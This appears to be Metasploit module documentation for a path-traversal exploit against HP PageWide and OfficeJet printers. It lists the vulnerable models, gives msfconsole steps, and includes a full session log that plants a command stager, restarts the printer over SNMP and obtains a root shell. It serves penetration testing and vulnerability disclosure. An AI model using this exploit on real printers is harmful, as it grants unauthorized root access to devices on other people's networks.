## Vulnerable Devices

  Impacted printers have a firmware version below 1708D.

  Product Name                             | Model
  ---------------------------------------- | -------------------------------
  HP PageWide Managed MFP P57750dw         | J9V82A, J9V82B, J9V82C, J9V82D
  HP PageWide Managed P55250dw             | J6U55A, J6U55B, J6U55C, J6U55D
  HP PageWide Pro MFP 577z                 | K9Z76A, K9Z76D
  HP PageWide Pro 552dw                    | D3Q17A, D3Q17C, D3Q17D
  HP PageWide Pro MFP 577dw                | D3Q21A, D3Q21C, D3Q21D
  HP PageWide Pro MFP 477dw                | D3Q20A, D3Q20B, D3Q20C, D3Q20D
  HP PageWide Pro  452dw                   | D3Q16A, D3Q16B, D3Q16C, D3Q16D
  HP PageWide Pro MFP 477dn                | D3Q19A, D3Q19D
  HP PageWide Pro  452dn                   | D3Q15A, D3Q15B, D3Q15D
  HP PageWide MFP 377dw                    | J9V80A, J9V80B
  HP PageWide 352dw                        | J6U57B
  HP OfficeJet Pro 8730 All-in-One Printer | D9L20A
  HP OfficeJet Pro 8740 All-in-One Printer | D9L21A
  HP OfficeJet Pro 8210 Printer            | D9L63A, D9L64A
  HP OfficeJet Pro 8216 Printer            | T0G70A
  HP OfficeJet Pro 8218 Printer            | J3P68A

## Verification Steps

  1. Start msfconsole
  2. Do: `use exploit/linux/misc/hp_jetdirect_path_traversal`
  3. Do: `set rhost <hostname>`
  4. Do: `exploit`
  5. You should get a shell.

## Scenarios

### HP OfficeJet Pro 8210 Printer

  The following demonstrates the exploit against a vulnerable printer model.
  When the user is finished with the command shell session, they press control-c and
  respond yes to abort the session. This action sends the `CommandShellCleanupCommand`
  of the `cmd/unix/bind_busybox_telnetd` payload to the server in order to kill
  telnetd that was used to get the command shell.

  ```
  msf > use exploit/linux/misc/hp_jetdirect_path_traversal
  msf exploit(linux/misc/hp_jetdirect_path_traversal) > set rhost 192.168.1.107
  rhost => 192.168.1.107
  msf exploit(linux/misc/hp_jetdirect_path_traversal) > exploit

  [*] 192.168.1.107:9100 - Exploiting...
  [*] Started bind handler
  [*] 192.168.1.107:9100 - Connecting to port 9100...
  [*] 192.168.1.107:9100 - Attempting to write command stager...
  [+] 192.168.1.107:9100 - Successfully wrote command stager to 0:/../../rw/var/etc/profile.d/dLDZtDsh.sh
  [*] 192.168.1.107:161 - Connecting to SNMP port 161...
  [*] 192.168.1.107:161 - Initial value of prtGeneralReset OID 1.3.6.1.2.1.43.5.1.1.3.1 => 3
  [*] 192.168.1.107:161 - Attempting to restart printer via SNMP...
  [*] 192.168.1.107:161 - Set prtGeneralReset OID 1.3.6.1.2.1.43.5.1.1.3.1 => 4
  [*] 192.168.1.107:161 - Current value of prtGeneralReset OID 1.3.6.1.2.1.43.5.1.1.3.1 => 3
  [*] 192.168.1.107:161 - Printer restarting...
  [*] Command shell session 1 opened (192.168.1.101:38141 -> 192.168.1.107:4444) at 2017-12-31 21:09:40 -0600


  [root@HPC2A3FB ]# id
  id
  uid=0(root) gid=0(root)
  [root@HPC2A3FB ]# uname -a
  uname -a
  Linux HPC2A3FB 3.14.32 #001.1614A Wed Mar 30 16:58:30 PDT 2016 armv7l GNU/Linux
  [root@HPC2A3FB ]# ^C
  Abort session 1? [y/N]  y

  [*] 192.168.1.107 - Command shell session 1 closed.  Reason: User exit
  msf exploit(linux/misc/hp_jetdirect_path_traversal) > 
  ```

  ## Notes

  The shell cleanup command should result in the payload automatically terminating
  the telnetd service as the session completes. However, intermittent behavior was
  observed and the source has not been identified. When closing a session please
  verify, via a port scan or other desired method, that the port is no longer open.
  If the port remains open, then the unauthenticated telnetd service is still running.
  Establish a connection to the unauthenticated telnetd service and manually terminate
  the process (`pkill telnetd`) to avoid leaving the host more insecure.
